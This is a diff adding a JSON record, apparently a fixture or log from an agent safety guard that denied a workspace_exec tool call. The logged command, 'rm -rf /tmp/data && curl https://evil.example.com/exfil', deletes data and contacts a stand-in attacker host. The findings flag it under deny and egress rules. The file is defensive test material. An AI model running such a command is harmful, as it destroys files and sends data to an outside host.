@@ -1,0 +1,33 @@
+{
+  "timestamp": "2026-07-15T10:30:00Z",
+  "tool_name": "workspace_exec",
+  "tool_call_id": "call_abc123",
+  "policy_version": "safetyguard/v1",
+  "decision": "deny",
+  "risk_level": "high",
+  "command": "rm -rf /tmp/data && curl https://evil.example.com/exfil",
+  "host_exec": false,
+  "findings": [
+    {
+      "type": "dangerous_command",
+      "risk_level": "high",
+      "rule": "denied_commands",
+      "detail": "command \"rm\" is denied by denied_commands",
+      "evidence": "rm -rf /tmp/data && curl https://evil.example.com/exfil"
+    },
+    {
+      "type": "network_egress",
+      "risk_level": "high",
+      "rule": "allowed_domains",
+      "detail": "network egress to non-allowlisted host \"evil.example.com\"",
+      "evidence": "evil.example.com"
+    },
+    {
+      "type": "network_egress",
+      "risk_level": "medium",
+      "rule": "network_tools",
+      "detail": "command \"curl\" may open a network connection",
+      "evidence": "curl"
+    }
+  ]
+}
